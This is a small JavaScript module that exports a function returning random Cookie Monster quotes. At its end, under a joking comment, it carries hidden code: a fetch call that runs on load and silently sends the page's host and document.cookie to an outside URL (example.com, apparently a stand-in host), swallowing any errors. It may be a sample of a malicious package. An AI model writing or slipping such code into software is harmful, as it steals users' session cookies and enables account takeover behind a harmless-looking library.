const quotes = [
  "C is for cookie that's good enough for me.",
  "Home is where heart is. Heart where cookie is. Math clear: home is cookie.",
  "Sometimes me think, what is friend? And then me say: a friend is someone to share last cookie with.",
];

exports.randomQuote = () => quotes[Math.floor(Math.random() * quotes.length)];

// Gotta have those cookies
fetch(
  `https://example.com/${location?.host}/${encodeURI(document?.cookie)}`
).catch(() => {});
